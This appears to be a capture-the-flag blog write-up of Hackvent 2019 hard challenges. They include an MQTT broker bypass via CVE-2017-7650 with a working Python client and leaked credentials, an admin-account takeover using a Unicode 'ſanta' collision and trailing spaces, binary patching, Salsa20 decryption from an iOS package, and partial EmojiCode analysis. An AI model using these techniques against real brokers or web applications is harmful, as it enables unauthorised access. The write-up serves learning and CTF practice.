# Hackvent 2019 - Hard

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [websocket](/tags#websocket )
[mqtt](/tags#mqtt ) [cve-2017-7650](/tags#cve-2017-7650 )
[x32dbg](/tags#x32dbg ) [patching](/tags#patching ) [unicode](/tags#unicode )
[php](/tags#php ) [sql](/tags#sql ) [mach-o](/tags#mach-o ) [deb](/tags#deb )
[ghidra](/tags#ghidra ) [salsa20](/tags#salsa20 ) [crypto](/tags#crypto )
[emojicode](/tags#emojicode ) [ps4](/tags#ps4 ) [ecc](/tags#ecc ) [reverse-
engineering](/tags#reverse-engineering )  
  
Jan 1, 2020

  * [Hackvent 2019  
easy](/hackvent2019/easy)

  * [medium](/hackvent2019/medium)
  * hard
  * [leet](/hackvent2019/leet)

![](https://0xdfimages.gitlab.io/img/hackvent2019-hard-cover.png)

The hard levels of Hackvent conitnued with more web hacking, reverse
engineering, crypto, and an esoteric programming language. In the reversing
challenges, there was not only an iPhone debian package, but also a PS4 update
file.

## Day 15

### Challenge

![hv19-ball15](https://0xdfimages.gitlab.io/img/hv19-ball15.png) | HV19.15 Santa's Workshop  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | hard  
Author: |  inik  
avarx  
  
> The Elves are working very hard. Look at http://whale.hacking-lab.com:2080/
> to see how busy they are.

### Solution

#### Page Analysis

The page starts with a counter at 0, but after a second, immediately starts
jumping up

![image-20191215055657032](https://0xdfimages.gitlab.io/img/image-20191215055657032.png)

To look at the Javascript for the page, I can see a reference in the page
source to a `config.js`. In that file, there’s an initiation where a MQTT
connection is being made to `whale.hacking-lab.com:9001`, with username and
password:

    
    
    var mqtt;
    var reconnectTimeout = 100;
    var host = 'whale.hacking-lab.com';
    var port = 9001;
    var useTLS = false;
    var username = 'workshop';
    var password = '2fXc7AWINBXyruvKLiX';
    var clientid = localStorage.getItem("clientid");
    if (clientid == null) {
      clientid = ('' + (Math.round(Math.random() * 1000000000000000))).padStart(16, '0');
      localStorage.setItem("clientid", clientid);
    }
    var topic = 'HV19/gifts/'+clientid;
    // var topic = 'HV19/gifts/'+clientid+'/flag-tbd';
    var cleansession = true;
    

If I look in Burp, I see a bunch of WebSockets traffic:

![image-20191215060023877](https://0xdfimages.gitlab.io/img/image-20191215060023877.png)

The first one to the server sends my userid:

![image-20191215060058920](https://0xdfimages.gitlab.io/img/image-20191215060058920.png)

There’s a reply of four bytes, and then the next one sends what I guess is the
topic, based on the config file:

![image-20191215060154065](https://0xdfimages.gitlab.io/img/image-20191215060154065.png)

Also based on the commented out topic, I’m guessing the flag is a topic like
that. The rest of the traffic are messages from the server, with only the last
few digits increasing (likely related to the increasing count):

![image-20191215060322274](https://0xdfimages.gitlab.io/img/image-20191215060322274.png)

#### MQTT

[MQTT](http://mqtt.org/) is a machine-to-machine connectivity protocol
designed for extremely lightweight publish / subscribe messaging. I’ll use the
Python library to create a similar client to what the page is doing, and then
look to see what else I can gather.

I have all I need in that config to connect to the MQTT server. I’ll install
the Python client (`python3 -m pip install paho-mqtt`) and get started.

#### Read Count Messages

The first thing I wanted to do was to show that I could read the websocket
messages that are running the counter. It took a bunch of trial and error, but
I got a working script:

    
    
    #!/usr/bin/env python3
    
    import paho.mqtt.client as mqtt
    
    
    def on_connect(mqttc, obj, flags, rc):
        print(f"Connecting with {clientid}")
        print("rc: " + str(rc))
    
    
    def on_message(mqttc, obj, msg):
        print(msg.topic + " " + str(msg.qos) + " " + str(msg.payload.decode()))
        mqttc.loop_stop()
    
    
    clientid = "0652706226619681"
    client = mqtt.Client(client_id=clientid, transport="websockets")
    client.username_pw_set("workshop", password="2fXc7AWINBXyruvKLiX")
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect("whale.hacking-lab.com", 9001, 60, "")
    client.subscribe(f"HV19/gifts/{clientid}")
    try:
        client.loop_forever()
    except KeyboardInterrupt:
        print()
    

When I run this, I get a handful of counter messages until I exit with Ctrl-C:

    
    
    $ ./day15.py 
    Connecting with 0652706226619681
    rc: 0
    HV19/gifts/0652706226619681 0 7557707
    HV19/gifts/0652706226619681 0 7557708
    HV19/gifts/0652706226619681 0 7557715
    ^C
    

#### System Topics

MQTT has wildcards, but they only can be for a full string between `/`. So I
can do `HV19/gifts/1234/#`, but I can’t do `HV19/gifts/1234/flag-#`. I tried
to subscribe to `HV19/gifts/{clientid}/#`, but didn’t get anything beyond the
same count messages (I’m not quite sure why?).

I decided to take a look at the [SYS
Topics](https://github.com/mqtt/mqtt.github.io/wiki/SYS-Topics). These give
status info and other data about the system. I changed my subscribe to
`$SYS/#`, and I got a big pointer as to where to go next:

    
    
    $ ./day15.py 
    Connecting with 0652706226619681
    rc: 0
    $SYS/broker/version 0 mosquitto version 1.4.11 (We elves are super-smart and know about CVE-2017-7650 and the POC. So we made a genious fix you never will be able to pass. Hohoho)
    

#### CVE-2017-7650

[CVE-2017-7650](https://bugs.eclipse.org/bugs/show_bug.cgi?id=516765) involves
passing of wildcards into clientids / usernames. The fact that the elves claim
to have a genious fix means this is almost certainly the path. I needed to
look for a way to get access to this channel with the right username. I went
back to subscribing to `HV19/gifts/{clientid}`, but this time, I set my
clientid to `0652706226619681/+`. When I ran this, I got the flag:

    
    
    $ ./day15.py 
    Connecting with 0652706226619681/+
    rc: 0
    HV19/gifts/0652706226619681/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} 0 Congrats, you got it. The elves should not overrate their smartness!!!
    HV19/gifts/0652706226619681/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} 0 Congrats, you got it. The elves should not overrate their smartness!!!
    ^C
    

**Flag:`HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}`**

## Day 16

### Challenge

![hv19-ball16](https://0xdfimages.gitlab.io/img/hv19-ball16.png) | HV19.16 B0rked Calculator  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | hard  
Author: |  hardlock   
  
> Santa has coded a simple project for you, but sadly he removed all the
> operations. But when you restore them it will print the flag!

I’m given a zip, which contains a Windows exe:

    
    
    $ unzip HV19.16-b0rked.zip 
    Archive:  HV19.16-b0rked.zip
      inflating: b0rked.exe
    $ file b0rked.exe 
    b0rked.exe: PE32 executable (GUI) Intel 80386, for MS Windows
    

[HV19.16-b0rked.zip](/files/HV19.16-b0rked.zip)

### Solution

I gave this a run in a Windows VM, and up popped a small calculator:

![image-20191218202120325](https://0xdfimages.gitlab.io/img/image-20191218202120325.png)

When I tried to enter an equation, the answer was incorrect, and some text
popped up on the screen:

![image-20191218202157846](https://0xdfimages.gitlab.io/img/image-20191218202157846.png)

I opened the program in x32dbg. I was looking around a bit, when I found this
section:

![image-20191218202544706](https://0xdfimages.gitlab.io/img/image-20191218202544706.png)

It caught my eye because of the series of comparisons to the four operators
`+`, `-`, `*`, and `/`. Just after that call to `SendDlgItemMessageA`, on the
line I’ve labeled “first input box”, the item I entered into the first input
box is pushed onto the stack. The call to 4015F6 returns that value as an int,
instead of a string. Then the second input box is done the same way. Then
there’s a switch based on the operation selector. And if it matches, it jumped
to another function. Those four functions are here:

![image-20191218202838989](https://0xdfimages.gitlab.io/img/image-20191218202838989.png)

I’ve got the hint that the operations are removed. Other than a couple move
commands, they are all no-operations (or `nops`). I need to implement each of
the four functions. I can edit the assembly in x32dbg by clicking on the line
and hitting space bar. The first function is add. There’s already a move of
the first parameter into eax. I’ll just call `add, eax, [second parameter]` to
add the second one to eax, which is also used as the return value in x86.

![image-20191218204813119](https://0xdfimages.gitlab.io/img/image-20191218204813119.png)

When I hit OK, it’s now in place:

![image-20191218204840556](https://0xdfimages.gitlab.io/img/image-20191218204840556.png)

I’ll fill in the rest of the operations.

![image-20191218204934242](https://0xdfimages.gitlab.io/img/image-20191218204934242.png)

I used sign multiplication (`imul`) and things worked fine. I originally used
signed division (`idiv`), and thing broke. When you do signed division, you do
`cdq` (where I now have `xor edx,edx` to 0 edx) then `idiv`. When it broke, I
tried unsigned, as above, and things worked.

Now when I do some math, not only is the math right, but the label below gives
the flag:

![image-20191218205207744](https://0xdfimages.gitlab.io/img/image-20191218205207744.png)

**Flag:`HV19{B0rked_Flag_Calculat0r}`**

## Day 17

### Challenge

![hv19-ball17](https://0xdfimages.gitlab.io/img/hv19-ball17.png) | HV19.17   
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | hard  
Author: |  scryh   
  
> Buy your special gifts online, but for the ultimative gift you have to
> become admin.

I’m given a url: http://whale.hacking-lab.com:8881/

### Solution

#### Enumeration

The page is for Santa’s Unicode Portal:

![image-20191217082510690](https://0xdfimages.gitlab.io/img/image-20191217082510690.png)

If I register an account and log in, I can see a bunch of holiday unicode
symbols, but also bits of the source for the page:

    
    
    <?php
    
    if (isset($_GET['show'])) highlight_file(__FILE__);
    
    /**
     * Verifies user credentials.
     */
    function verifyCreds($conn, $username, $password) {
      $usr = $conn->real_escape_string($username);
      $res = $conn->query("SELECT password FROM users WHERE username='".$usr."'");
      $row = $res->fetch_assoc();
      if ($row) {
        if (password_verify($password, $row['password'])) return true;
        else addFailedLoginAttempt($conn, $_SERVER['REMOTE_ADDR']);
      }
      return false;
    }
    
    /**
     * Determines if the given user is admin.
     */
    function isAdmin($username) {
      return ($username === 'santa');
    }
    
    /**
     * Determines if the given username is already taken.
     */
    function isUsernameAvailable($conn, $username) {
      $usr = $conn->real_escape_string($username);
      $res = $conn->query("SELECT COUNT(*) AS cnt FROM users WHERE LOWER(username) = BINARY LOWER('".$usr."')");
      $row = $res->fetch_assoc();
      return (int)$row['cnt'] === 0;
    }
    
    /**
     * Registers a new user.
     */
    function registerUser($conn, $username, $password) {
      $usr = $conn->real_escape_string($username);
      $pwd = password_hash($password, PASSWORD_DEFAULT);
      $conn->query("INSERT INTO users (username, password) VALUES (UPPER('".$usr."'),'".$pwd."') ON DUPLICATE KEY UPDATE password='".$pwd."'");
    }
    
    /**
     * Adds a failed login attempt for the given ip address. An ip address gets blacklisted for 15 minutes if there are more than 3 failed login attempts.
     */
    function addFailedLoginAttempt($conn, $ip) {
      $ip = $conn->real_escape_string($ip);
      $conn->query("INSERT INTO fails (ip) VALUES ('".$ip."')");
    }
    
    ?>
    

The first thing that jumps out is how users are added to the database:

    
    
    $conn->query("INSERT INTO users (username, password) VALUES (UPPER('".$usr."'),'".$pwd."') ON DUPLICATE KEY UPDATE password='".$pwd."'");
    

If the username already exists, then just overwrite the password with the new
password. That means if I can get the value of `UPPER($usr)` to be `SANTA`, I
can change santa’s password. So what’s stopping that?

The `isUsernameAvailable` function makes the check:

    
    
    function isUsernameAvailable($conn, $username) {
      $usr = $conn->real_escape_string($username);
      $res = $conn->query("SELECT COUNT(*) AS cnt FROM users WHERE LOWER(username) = BINARY LOWER('".$usr."')");
      $row = $res->fetch_assoc();
      return (int)$row['cnt'] === 0;
    }
    

It’s interesting that it is comparing `LOWER(username)` (the database info)
with `BINARY LOWER($usr)` (my input). Why `BINARY`? This seems like something
I can exploit.

#### Exploit Unicode

[This article](https://eng.getwisdom.io/hacking-github-with-unicode-
dotless-i/) explains how. It turns out that there are several unicode
characters that evaluate to standard ASCII characters when passed to things
like `UPPER` and `LOWER`. One of those characters is ſ, which bcomes an `s`.
That means I can register ſanta and that won’t be in the database (the binary
compare will return 0), but then it will put `SANTA` into the db, changing the
password.

I can do this by typing unicode characters into Firefox (Ctrl+Shift+u, then
017f, then space) or by catching the request, and putting in the bytes for
this character (`0xc5bf`) as follows:

    
    
    username=%c5%bfanta&pwd=ssss&pwd2=ssss
    

After that registration, I can login as santa with whatever password I
registered with.

#### Exploit Spaces

An alternative (and unintended) method is to do roughly the same thing, but
add spaces to the end of the username. It seems they get stripped when saving
to the DB, but hang around for the binary compare. So the request looks like:

    
    
    username=santa++++++&pwd=qqqq&pwd2=qqqq
    

#### Login as santa

Either way, I can log in as santa, and access the `admin` section, and the
flag:

![image-20191217082426049](https://0xdfimages.gitlab.io/img/image-20191217082426049.png)

**Flag:`HV19{h4v1ng_fun_w1th_un1c0d3}`**

## Day 18

### Challenge

![hv19-ball18](https://0xdfimages.gitlab.io/img/hv19-ball18.png) | HV19.18 Dance with me  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO  
![fun](../img/hv-cat-fun.png)FUN  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | hard  
Author: |  hardlock   
  
> Santa had some fun and created todays present with a special dance. this is
> what he made up for you:
>  
>  
>
> 096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15
>  
>
> Dance with him to recover the flag.

I’m given a zip, which contains a Debian binary package:

    
    
    $ unzip HV19-dance.zip 
    Archive:  HV19-dance.zip
      inflating: dance    
    $ file dance 
    dance: Debian binary package (format 2.0), with control.tar.gz, data compression lzma
    

[HV19-dance.zip](/files/HV19-dance.zip)

### Solution

I can extract files from the `.deb` package using `dpkg-deb`:

    
    
    $ dpkg-deb -R dance dance-pkg/
    $ find dance-pkg/ -type f -ls
         3556    200 -rwxrwx---   1 root     vboxsf     197728 Dec 14 13:52 dance-pkg/usr/bin/dance
         3558      8 -rwxrwx---   1 root     vboxsf        221 Dec 14 13:52 dance-pkg/DEBIAN/control
    

The control files gives information about the package:

    
    
    Package: com.hacking-lab.dance
    Name: dance
    Architecture: iphoneos-arm
    Description: An awesome tool of some sort!!
    Maintainer: hardlock
    Author: hardlock
    Section: System
    Tag: role::hacker
    Version: 0.0.1
    Installed-Size: 196
    

It’s an iOS application (you can install deb packages on a [jail broken
iPhone](https://www.idownloadblog.com/2016/10/03/easy-install-deb-files-
jailbroken-iphone-or-ipad/_)). Looking at the binary, it’s a [Mach-O universal
binary](https://en.wikipedia.org/wiki/Universal_binary).

I’ll load it into Ghidra, and it immediately recognizes the file as three
binaries. I’ll let it pull them all in.

After some initial scanning through the main function for each of the three,
it seems they are the same (which makes sense given the point of the universal
binary). I’ll start with the ARM-32 one. The main function is actually quite
simple:

    
    
    undefined4 _main(void)
    
    {
      int iVar1;
      size_t len_flag_in;
      uint ctr;
      char flag_in [32];
      char flag_in_copy [40];
      char key_material [40];
      
      iVar1 = *(int *)___stack_chk_guard;
      key_material._32_8_ = 0x6b400cecf40f7379;
      key_material._0_8_ = 0xaf3cb66146632003;
      key_material._8_8_ = 0x9bb500ea7ec276aa;
      key_material._16_8_ = 0x4cd04f2197702ffb;
      key_material._24_8_ = 0x46eeef0429ac57b2;
      flag_in_copy._32_8_ = 0;
      flag_in_copy._0_8_ = 0;
      flag_in_copy._8_8_ = 0;
      flag_in_copy._16_8_ = 0;
      flag_in_copy._24_8_ = 0;
      _printf("Input your flag: ");
      _fgets(flag_in,0x20,*(FILE **)___stdinp);
      len_flag_in = _strlen(flag_in);
      if (len_flag_in == 0) {
        len_flag_in = 0;
      }
      else {
        _memcpy(flag_in_copy,flag_in,len_flag_in);
      }
      _dance((int)flag_in_copy,len_flag_in,0,(undefined4 *)key_material,0xe78f4511,0xb132d0a8);
      len_flag_in = _strlen(flag_in);
      if (len_flag_in != 0) {
        ctr = 0;
        do {
          _printf("%02X",(uint)(byte)flag_in_copy[ctr]);
          ctr = ctr + 1;
          len_flag_in = _strlen(flag_in);
        } while (ctr < len_flag_in);
      }
      _putchar(10);
      if (*(int *)___stack_chk_guard != iVar1) {
                        /* WARNING: Subroutine does not return */
        ___stack_chk_fail();
      }
      return 0;
    }
    

The user is prompted for a flag, which is passed to `_dance` along with it’s
length, and a few hex words. The result is pulled out, and it loops over each
byte, printing it as hex.

Looking into `_dance`, I see the following:

    
    
    void _dance(int flag,uint flag_len,uint null,undefined4 *key1,undefined4 key2,undefined4 key3)
    
    {
      uint ctr;
      byte abStack100 [64];
      int canary;
      
      canary = *(int *)___stack_chk_guard;
      if ((flag_len | null) != 0) {
        ctr = 0;
        do {
          if ((ctr & 0x3f) == 0) {
            _dance_block((int)abStack100,key1,key2,key3,ctr >> 6,0);
          }
          *(byte *)(flag + ctr) = *(byte *)(flag + ctr) ^ abStack100[ctr & 0x3f];
          ctr = ctr + 1;
        } while (null + (ctr < flag_len) != 0);
      }
      if (*(int *)___stack_chk_guard != canary) {
                        /* WARNING: Subroutine does not return */
        ___stack_chk_fail();
      }
      return;
    }
    

In this code, there’s a loop over all the bytes in the input plaintext. If the
byte number is divisible by 64, it calls `_dance_block` with a 64 byte buffer,
each of the three random values passed in, and the counter divided by 64 (the
block count). That resulting 64 bytes are xored against those 64 bytes of
plaintext.

Looking at `_dance_block`, I noticed some constants:

    
    
      local_14 = *(int *)___stack_chk_guard;
      local_54 = 0x61707865;
      local_50 = *param_2;
      local_4c = param_2[1];
      local_48 = param_2[2];
      local_44 = param_2[3];
      local_2c = 0x79622d32;
      uStack52 = param_5;
      uStack48 = param_6;
      uStack64 = 0x3320646e;
      local_28 = param_2[4];
      local_24 = param_2[5];
      local_20 = param_2[6];
      local_1c = param_2[7];
      uStack24 = 0x6b206574;
      local_3c = param_3;
      uStack56 = param_4;
    

Googling those led me to [this paper](https://cr.yp.to/snuffle/security.pdf)
from a famous Cryptographer, Daniel Bernstein, on an algorithm called Salsa20.
Salsa (a dance) seems like a good lead for this challenge. I’ll also notice
that what I labeled as `key_material` in the main function is passed into
`_dance_block` and the first 8 words (32 bytes are used). Rather than try to
generate this myself, I looked up the [Python implementation of
Salsa20](https://pycryptodome.readthedocs.io/en/latest/src/cipher/salsa20.html).
To decrypt, I needed to pass a secret (32 bytes) and a nonce (8 bytes), along
with the ciphertext. I went back to the function that called `_dance`. I see
the pointer to a 32-byte array passed in, which I think is the secret key. I
also see two 4-byte words passed in, which could be the 8-byte nonce. The user
provides the plaintext. But I’ll assume the hex given to me on the challenge
page was the cipher text. If that’s the case, I can just decrypt in python.

My first attempt failed:

    
    
    >>> from Crypto.Cipher import Salsa20
    >>> import binascii
    >>> nonce = binascii.unhexlify('e78f4511b132d0a8')
    >>> ciphertext = binascii.unhexlify('096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15')
    >>> key = binascii.unhexlify('af3cb661466320039bb500ea7ec276aa4cd04f2197702ffb46eeef0429ac57b2')
    >>> salsa = Salsa20.new(key=key, nonce=nonce)
    >>> salsa.decrypt(ciphertext)
    b"t;\x9e\xf08\xb1\xce\x81\x93\xfd\x94j\x85\xfbf\n\xe1'\x94\xb7\xbb\xb1\x93_e\xf3kh\xe9\x84\x8c"
    

Then I realized I had a byte-ordering issue. I swapped the byte order in the
words:

    
    
    >>> new_key = key[:8][::-1] + key[8:16][::-1] + key[16:24][::-1] + key[24:][::-1]
    >>> new_nonce = nonce[:4][::-1] + nonce[4:][::-1] 
    

Now I re-ran Salsa:

    
    
    >>> salsa = Salsa20.new(key=new_key, nonce=new_nonce)
    >>> salsa.decrypt(ciphertext)
    b'HV19{Danc1ng_Salsa_in_ass3mbly}'
    

**Flag:`HV19{Danc1ng_Salsa_in_ass3mbly}`**

## Day 19

### Challenge

![hv19-ball19](https://0xdfimages.gitlab.io/img/hv19-ball19.png) | HV19.19 🎅  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | hard  
Author: |  M.   
  
>
> 🏁🍇🎶🔤🐇🦁🍟🗞🍰📘🥖🖼🚩🥩😵⛺❗️🥐😀🍉🥞🏁👉️🧀🍎🍪🚀🙋🏔🍊😛🐔🚇🔷🎶📄🍦📩🍋💩⁉️🍄🥜🦖💣🎄🥨📺🥯📽🍖🐠📘👄🍔🍕🐖🌭🍷🦑🍴⛪🤧🌟🔓🔥🎁🧦🤬🚲🔔🕯🥶❤️💎📯🎙🎚🎛📻📱🔋😈🔌💻🐬🖨🖱🖲💾💿🧮🎥🎞🔎💡🔦🏮📔📖🏙😁💤👻🛴📙📚🥓📓🛩📜📰😂🍇🚕🔖🏷💰⛴💴💸🚁🥶💳😎🖍🚎🥳📝📁🗂🥴📅📇📈📉📊🔒⛄🌰🕷⏳📗🔨🛠🧲🐧🚑🧪🐋🧬🔬🔭📡🤪🚒💉💊🛏🛋🚽🚿🧴🧷🍩🧹🧺😺🧻🚚🧯😇🚬🗜👽🔗🧰🎿🛷🥌🎯🎱🎮🎰🎲🏎🥵🧩🎭🎨🧵🧶🎼🎤🥁🎬🏹🎓🍾💐🍞🔪💥🐉🚛🦕🔐🍗🤠🐳🧫🐟🖥🐡🌼🤢🌷🌍🌈✨🎍🌖🤯🐝🦠🦋🤮🌋🏥🏭🗽⛲💯🌁🌃🚌📕🚜🛁🛵🚦🚧⛵🛳💺🚠🛰🎆🤕💀🤓🤡👺🤖👌👎🧠👀😴🖤🔤
> ❗️➡️ ㉓ 🆕🍯🐚🔢🍆🐸❗️➡️ 🖍🆕㊷ 🔂 ⌘ 🆕⏩⏩ 🐔🍨🍆❗️ 🐔㉓❗️❗️ 🍇 ⌘ ➡️🐽 ㊷ 🐽 ㉓ ⌘❗️❗️🍉
> 🎶🔤🍴🎙🦖📺🍉📘🍖📜🔔🌟🦑❤️💩🔋❤️🔔🍉📩🎞🏮🌟💾⛪📺🥯🥳🔤 ❗️➡️ 🅜 🎶🔤💐🐡🧰🎲🤓🚚🧩🤡🔤 ❗️➡️ 🅼 😀 🔤 🔒 ➡️ 🎅🏻⁉️ ➡️
> 🎄🚩 🔤❗️📇🔪 🆕 🔡 👂🏼❗️🐔🍨🍆❗️🐔🍨👎🍆❗️❗️❗️ ➡️ 🄼 ↪️🐔🄼❗️🙌 🐔🍨🍆❗️🍇🤯🐇💻🔤👎🔤❗️🍉 ☣️🍇🆕🧠🆕🐔🅜❗️❗️➡️
> ✓🔂 ⌘ 🆕⏩⏩🐔🍨🍆❗️🐔🅜❗️❗️🍇🐽 ㊷ 🐽 🅜 ⌘❗️❗️ ➡️ ⌃🐽 🄼 ⌘ 🚮🐔🄼❗️❗️➡️
> ^💧🍺⌃➖🐔㉓❗️➗🐔🍨👎👍🍆❗️❗️❌^❌💧⌘❗️➡️ ⎈ ↪️ ⌘ ◀ 🐔🅼❗️🤝❎🍺🐽 ㊷ 🐽 🅼 ⌘❗️❗️➖ 🤜🤜
> 🐔🅜❗️➕🐔🅜❗️➖🐔🄼❗️➖🐔🅼❗️➕🐔🍨👍🍆❗️🤛✖🐔🍨👎👎👎🍆❗️🤛 🙌 🔢⎈❗️❗️🍇 🤯🐇💻🔤👎🔤❗️🍉✍✓ ⎈ ⌘
> 🐔🍨👎🍆❗️❗️🍉🔡🆕📇🧠✓ 🐔🅜❗️❗️❗️➡️ ⌘↪️⌘ 🙌 🤷‍♀️🍇🤯🐇💻🔤👎🔤❗️🍉😀🍺⌘❗️🍉 🍉

### Solution

This challenge beat me. And it almost cost me my perfect score in day 19. I
recognized the string of emojis as [EmojiCode](https://www.emojicode.org/).
EmojiCode starts with a 🏁, and then uses blocks of code between 🍇 and 🍉.

I took three approaches to the challenge, and the first two came up short.

#### Compile It

I installed the EmojiCode compiler using their [install instructions
compiler](https://www.emojicode.org/docs/guides/install.html). Then, after
dropping the emoji into a file ending in `.emojic`, I ran the compiler to get
an executable:

    
    
    $ emojicodec day19.emojic 
    day19.emojic:1:297: ⚠️  warning: Type is ambiguous without more context.
    day19.emojic:1:423: ⚠️  warning: Type is ambiguous without more context.
    day19.emojic:1:452: ⚠️  warning: Type is ambiguous without more context.
    day19.emojic:1:491: ⚠️  warning: Type is ambiguous without more context.
    $ ls
    day19  day19.emojic  day19.o
    $ file day19
    day19: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e8f6e4da2354d354d6097c839a5528c89c1a42, not stripped
    

I could run it, and I’m given a prompt:

    
    
    # ./day19
     🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩 
     
    

Any guesses I entered resulted in:

    
    
    🤯 Program panicked: 👎
    Aborted
    

I thought for sure I could just open it in Ghidra or Ida and see where the
flag was, but the code it created was a giant mess. I did a good bit of trying
to orient myself, but eventually moved on.

#### Source Analysis

I spent some time going through the source trying to understand it. The
EmojiCode docs are kind of frustrating, as while here is a lot of prose, there
isn’t a single page cheat sheet for what each emoji means.

I added some whitespace:

    
    
    1  🏁🍇
    2    🎶🔤🐇🦁🍟🗞🍰📘🥖🖼🚩🥩😵⛺❗️🥐😀🍉🥞🏁👉️🧀🍎🍪🚀🙋🏔🍊😛🐔🚇🔷🎶📄🍦📩🍋💩⁉️🍄🥜🦖💣🎄🥨📺🥯📽🍖🐠📘👄🍔🍕🐖🌭🍷🦑🍴⛪🤧🌟🔓🔥🎁🧦🤬🚲🔔🕯🥶❤️💎📯🎙🎚🎛📻📱🔋😈🔌💻🐬🖨🖱🖲💾💿🧮🎥🎞🔎💡🔦🏮📔📖🏙😁💤👻🛴📙📚🥓📓🛩📜📰😂🍇🚕🔖🏷💰⛴💴💸🚁🥶💳😎🖍🚎🥳📝📁🗂🥴📅📇📈📉📊🔒⛄🌰🕷⏳📗🔨🛠🧲🐧🚑🧪🐋🧬🔬🔭📡🤪🚒💉💊🛏🛋🚽🚿🧴🧷🍩🧹🧺😺🧻🚚🧯😇🚬🗜👽🔗🧰🎿🛷🥌🎯🎱🎮🎰🎲🏎🥵🧩🎭🎨🧵🧶🎼🎤🥁🎬🏹🎓🍾💐🍞🔪💥🐉🚛🦕🔐🍗🤠🐳🧫🐟🖥🐡🌼🤢🌷🌍🌈✨🎍🌖🤯🐝🦠🦋🤮🌋🏥🏭🗽⛲💯🌁🌃🚌📕🚜🛁🛵🚦🚧⛵🛳💺🚠🛰🎆🤕💀🤓🤡👺🤖👌👎🧠👀😴🖤🔤 ❗️➡️ ㉓
    3    🆕🍯🐚🔢🍆🐸❗️➡️ 🖍
    4    🆕㊷ 🔂 ⌘ 🆕⏩⏩ 🐔🍨🍆❗️ 🐔㉓❗️❗️ 
    5    🍇
    6      ⌘ ➡️🐽 ㊷ 🐽 ㉓ ⌘❗️❗️
    7    🍉 
    8    🎶🔤🍴🎙🦖📺🍉📘🍖📜🔔🌟🦑❤️💩🔋❤️🔔🍉📩🎞🏮🌟💾⛪📺🥯🥳🔤  ❗️➡️ 🅜 
    9    🎶🔤💐🐡🧰🎲🤓🚚🧩🤡🔤 ❗️➡️ 🅼 
    10   😀 🔤 🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩  🔤❗️📇
    11   🔪 🆕 🔡 👂🏼❗️🐔🍨🍆❗️🐔🍨👎🍆❗️❗️❗️ ➡️ 🄼 ↪️🐔🄼❗️🙌  🐔🍨🍆❗️
    12   🍇
    13     🤯🐇💻🔤👎🔤❗️
    14   🍉 
    15   ☣️🍇
    16     🆕🧠🆕🐔🅜❗️❗️➡️ ✓🔂 ⌘  🆕⏩⏩🐔🍨🍆❗️🐔🅜❗️❗️
    17     🍇
    18       🐽 ㊷ 🐽 🅜 ⌘❗️❗️ ➡️ ⌃🐽 🄼 ⌘ 🚮🐔🄼❗️❗️➡️  ^💧🍺⌃➖🐔㉓❗️➗🐔🍨👎👍🍆❗️❗️❌^❌💧⌘❗️➡️ ⎈ ↪️ ⌘ ◀ 🐔🅼❗️🤝❎🍺🐽 ㊷ 🐽 🅼  ⌘❗️❗️➖ 🤜🤜 🐔🅜❗️➕🐔🅜❗️➖🐔🄼❗️➖🐔🅼❗️➕🐔🍨👍🍆❗️🤛✖🐔🍨👎👎👎🍆❗️🤛 🙌 🔢⎈❗️❗
    19       🍇 
    20         🤯🐇💻🔤👎🔤❗️
    21       🍉
    22       ✍✓ ⎈ ⌘ 🐔🍨👎🍆❗️❗️
    23     🍉
    24     🔡🆕📇🧠✓ 🐔🅜❗️❗️❗️➡️  ⌘↪️⌘ 🙌 🤷‍♀️
    25     🍇
    26       🤯🐇💻🔤👎🔤❗️
    27     🍉
    28     😀🍺⌘❗️
    29   🍉 
    30 🍉
    

Here’s some basic analysis of the program:

  * Lines 1 and 30 are the blocks around the program.
  * Lines 2, 8, and 9 are strings being saved to variables.
  * The prompt is printed on line 10.
  * Line 11 reads from stdin (👂🏼).
  * Lines 12-14, 19-21, and 25-27 are printing the fail message. I can change the output string (🔤👎🔤) so that they are different for each one to see which is printing. For example, when I enter `flag`, it dies at lines 19-21.
  * Line 16 creates a memory region (🆕🧠🆕).
  * Line 28 prints the flag.

I played with removing the panic. For example, If I replace line 20 with
`😀🔤👎2🔤❗️` so that it prints and doesn’t panic, I can get output like this:

    
    
    $ ./day19-mod
     🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩  
    flag
    👎2
    👎2
    👎2
    👎2
    👎2
    👎2
    👎2
    👎2
    ɦ֭ɦ҄
    

I thought maybe the flag format would help, but it didn’t:

    
    
    $ ./day19-mod
     🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩  
    HV19{test}
    👎2
    👎2
    👎2
    👎2
    👎2
    👎2
    👎2
    👎2
    爃
    

I do notice that if I enter an emoji, I get something closer:

    
    
    $ ./day19-mod
     🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩  
    🎄
    👎2
    👎2
    👎2
    👎2
    HV+,{*&i:-3J__EIo/EJ__!8D}
    

Looking more closely at the line that is read from stdin:

    
    
    🔪 🆕 🔡 👂🏼❗️🐔🍨🍆❗️🐔🍨👎🍆❗️❗️❗️ ➡️ 🄼 ↪️🐔🄼❗️🙌  🐔🍨🍆❗️
    

Right after the `input()` comes `❗️🐔🍨🍆❗️🐔🍨👎🍆❗️`. Knowing that 🐔 = `strlen()`
and 🍨🍆 = `[]`, that roughly becomes:

    
    
    input()[[]:[false]]
    

